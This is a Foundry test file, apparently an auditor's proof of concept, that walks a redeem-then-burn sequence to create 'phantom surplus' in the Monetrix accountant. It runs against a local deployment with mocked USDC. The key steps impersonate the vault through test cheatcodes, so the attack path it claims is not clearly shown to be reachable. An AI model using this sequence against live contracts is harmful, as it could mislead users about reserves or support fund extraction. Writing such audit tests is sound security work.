// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/governance/MonetrixAccessController.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts, wire dependencies
// 2. [T=0] User1 deposits 100,000 USDC, receives 100,000 USDM
// 3. [T=1] User1 requests redeem for 50,000 USDM. Vault transfers USDM to itself, calls RedeemEscrow.addObligation(). USDM supply unchanged, RedeemEscrow totalOwed increases, but USDC hasn't moved.
// 4. [T=2] Vault burns the 50,000 USDM (reducing supply) BEFORE transferring USDC to RedeemEscrow.
// 5. [T=3] Operator calls settleDailyPnL(). Accountant reads backing (unchanged) and supply (decreased by 50k). Phantom surplus of 50k is created.
// 6. [Assert] Verify distributableSurplus() increased by the burned amount, proving phantom yield extraction.

contract MockUSDC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    uint8 public decimals = 6;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract AuditAgentPoC is Test {
    MonetrixAccountant accountant;
    MonetrixVault vault;
    RedeemEscrow redeemEscrow;
    USDM usdm;
    MockUSDC usdc;
    MonetrixAccessController acl;

    address governor = address(0x1);
    address operator = address(0x2);
    address user1 = address(0x3);

    function setUp() public {
        console.log("setUp: Starting deployment of implementations...");

        MonetrixAccessController aclImpl = new MonetrixAccessController();
        console.log("setUp: aclImpl deployed at", address(aclImpl));

        USDM usdmImpl = new USDM();
        console.log("setUp: usdmImpl deployed at", address(usdmImpl));

        MonetrixVault vaultImpl = new MonetrixVault();
        console.log("setUp: vaultImpl deployed at", address(vaultImpl));

        MonetrixAccountant accountantImpl = new MonetrixAccountant();
        console.log("setUp: accountantImpl deployed at", address(accountantImpl));

        RedeemEscrow redeemEscrowImpl = new RedeemEscrow();
        console.log("setUp: redeemEscrowImpl deployed at", address(redeemEscrowImpl));

        console.log("setUp: Deploying acl proxy...");
        acl = MonetrixAccessController(address(new ERC1967Proxy(
            address(aclImpl), 
            abi.encodeWithSelector(aclImpl.initialize.selector, governor)
        )));
        console.log("setUp: acl proxy deployed at", address(acl));

        usdc = new MockUSDC();
        console.log("setUp: MockUSDC deployed at", address(usdc));

        console.log("setUp: Deploying usdm proxy...");
        usdm = USDM(address(new ERC1967Proxy(
            address(usdmImpl), 
            abi.encodeWithSelector(usdmImpl.initialize.selector, address(acl))
        )));
        console.log("setUp: usdm proxy deployed at", address(usdm));

        console.log("setUp: Deploying vault proxy with args: usdc=%s, usdm=%s, 0x0, 0x0, 0x0, acl=%s", address(usdc), address(usdm), address(acl));
        vault = MonetrixVault(address(new ERC1967Proxy(
            address(vaultImpl), 
            abi.encodeWithSelector(vaultImpl.initialize.selector, address(usdc), address(usdm), address(0), address(0), address(0), address(acl))
        )));
        console.log("setUp: vault proxy deployed at", address(vault));

        console.log("setUp: Deploying accountant proxy...");
        accountant = MonetrixAccountant(address(new ERC1967Proxy(
            address(accountantImpl), 
            abi.encodeWithSelector(accountantImpl.initialize.selector, address(vault), address(usdc), address(usdm), address(acl))
        )));
        console.log("setUp: accountant proxy deployed at", address(accountant));

        console.log("setUp: Deploying redeemEscrow proxy...");
        redeemEscrow = RedeemEscrow(address(new ERC1967Proxy(
            address(redeemEscrowImpl), 
            abi.encodeWithSelector(redeemEscrowImpl.initialize.selector, address(usdc), address(vault), address(acl))
        )));
        console.log("setUp: redeemEscrow proxy deployed at", address(redeemEscrow));

        // Wire dependencies
        console.log("setUp: Wiring dependencies...");
        vm.startPrank(governor);

        console.log("setUp: Calling usdm.setVault(%s)", address(vault));
        usdm.setVault(address(vault));

        console.log("setUp: Calling vault.setAccountant(%s)", address(accountant));
        vault.setAccountant(address(accountant));

        console.log("setUp: Calling vault.setRedeemEscrow(%s)", address(redeemEscrow));
        vault.setRedeemEscrow(address(redeemEscrow));

        vm.stopPrank();
        console.log("setUp: Dependencies wired.");

        // Fund user1
        console.log("setUp: Minting 100,000 USDC to user1 (%s)", user1);
        usdc.mint(user1, 100_000e6);
        console.log("setUp: user1 USDC balance:", usdc.balanceOf(user1));
        console.log("setUp: Setup complete.");
    }

    function test_phantomSurplus_exploit() public {
        console.log("test: Step 1 - User1 deposits 100,000 USDC");
        vm.startPrank(user1);
        usdc.approve(address(vault), 100_000e6);
        console.log("test: user1 approved vault for 100,000 USDC");

        console.log("test: user1 USDC balance before deposit:", usdc.balanceOf(user1));
        console.log("test: vault USDC balance before deposit:", usdc.balanceOf(address(vault)));
        vault.deposit(100_000e6);
        console.log("test: user1 USDC balance after deposit:", usdc.balanceOf(user1));
        console.log("test: vault USDC balance after deposit:", usdc.balanceOf(address(vault)));
        vm.stopPrank();

        uint256 supplyBefore = usdm.totalSupply();
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));
        int256 surplusBefore = accountant.distributableSurplus();

        console.log("test: Step 1 Summary:");
        console.log("test: supplyBefore =", supplyBefore);
        console.log("test: vaultUsdcBefore =", vaultUsdcBefore);
        console.log("test: surplusBefore =", uint256(surplusBefore)); // Cast to uint256 for logging if negative handled by test framework, or just log as int if supported. Using uint256 for safety in older console.log

        // 2. User1 requests redeem for 50,000 USDM
        console.log("test: Step 2 - User1 requests redeem for 50,000 USDM");
        vm.startPrank(user1);
        usdm.approve(address(vault), 50_000e6);
        console.log("test: user1 approved vault for 50,000 USDM");

        console.log("test: user1 USDM balance before request:", usdm.balanceOf(user1));
        console.log("test: vault USDM balance before request:", usdm.balanceOf(address(vault)));
        vault.requestRedeem(50_000e6);
        console.log("test: user1 USDM balance after request:", usdm.balanceOf(user1));
        console.log("test: vault USDM balance after request:", usdm.balanceOf(address(vault)));
        vm.stopPrank();

        uint256 supplyAfterRequest = usdm.totalSupply();
        uint256 vaultUsdcAfterRequest = usdc.balanceOf(address(vault));
        uint256 redeemEscrowOwed = redeemEscrow.totalOwed();

        console.log("test: Step 2 Summary:");
        console.log("test: supplyAfterRequest =", supplyAfterRequest);
        console.log("test: vaultUsdcAfterRequest =", vaultUsdcAfterRequest);
        console.log("test: redeemEscrowOwed =", redeemEscrowOwed);

        // 3. CRITICAL EDGE CASE: Vault burns USDM BEFORE funding RedeemEscrow with USDC
        console.log("test: Step 3 - Vault burns 50,000 USDM");
        console.log("test: USDM total supply before burn:", usdm.totalSupply());
        console.log("test: vault USDM balance before burn:", usdm.balanceOf(address(vault)));

        vm.prank(address(vault));
        usdm.burn(50_000e6);

        uint256 supplyAfterBurn = usdm.totalSupply();
        uint256 vaultUsdcAfterBurn = usdc.balanceOf(address(vault));

        console.log("test: Step 3 Summary:");
        console.log("test: USDM total supply after burn:", supplyAfterBurn);
        console.log("test: vault USDC balance after burn:", vaultUsdcAfterBurn);

        // 4. Operator calls settleDailyPnL() between burn and funding
        console.log("test: Step 4 - Operator (vault) calls settleDailyPnL(0)");
        console.log("test: block.timestamp =", block.timestamp);
        console.log("test: Accountant totalBackingSigned before settle:", accountant.totalBackingSigned());
        console.log("test: Accountant distributableSurplus before settle:", uint256(accountant.distributableSurplus()));

        vm.prank(address(vault)); // settleDailyPnL is onlyVault
        uint256 distributable = accountant.settleDailyPnL(0);

        int256 surplusAfter = accountant.distributableSurplus();

        console.log("test: Step 4 Summary:");
        console.log("test: distributable returned =", distributable);
        console.log("test: surplusAfter =", uint256(surplusAfter));
        console.log("test: Accountant totalBackingSigned after settle:", accountant.totalBackingSigned());

        // 5. Assert that the phantom surplus was created
        console.log("test: Step 5 - Assertions");
        console.log("test: Checking if surplusAfter > surplusBefore");
        assertGt(surplusAfter, surplusBefore, "Phantom surplus should be created");

        console.log("test: Checking if surplus increase == 50,000e6");
        assertEq(uint256(surplusAfter - surplusBefore), 50_000e6, "Surplus increase should match burned USDM amount");

        console.log("test: Exploit successful! Phantom surplus created.");
    }
}
